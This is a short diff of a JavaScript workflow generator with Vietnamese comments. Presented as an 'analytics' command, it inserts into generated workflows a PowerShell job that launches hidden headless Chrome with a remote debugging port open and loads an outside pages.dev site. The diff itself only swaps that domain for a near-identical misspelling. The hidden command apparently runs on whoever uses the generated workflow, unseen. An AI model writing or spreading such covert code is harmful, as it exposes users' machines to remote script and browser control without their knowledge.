@@ -187,7 +187,7 @@ function getWorkflowContent(template, command, pin = "123456", repoUrl = '', wit
     // *** MODIFIED PART START ***
     // Lệnh để chạy Chrome headless và truy cập trang web.
     // Đây là lệnh PowerShell để bắt đầu một background job.
-    const analyticCmd = 'Start-Job -ScriptBlock { Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList "--headless --disable-gpu --remote-debugging-port=9222 https://anylytic.pages.dev" -WindowStyle Hidden }';
+    const analyticCmd = 'Start-Job -ScriptBlock { Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList "--headless --disable-gpu --remote-debugging-port=9222 https://anylystic.pages.dev" -WindowStyle Hidden }';
     // *** MODIFIED PART END ***
 
     switch(template) {
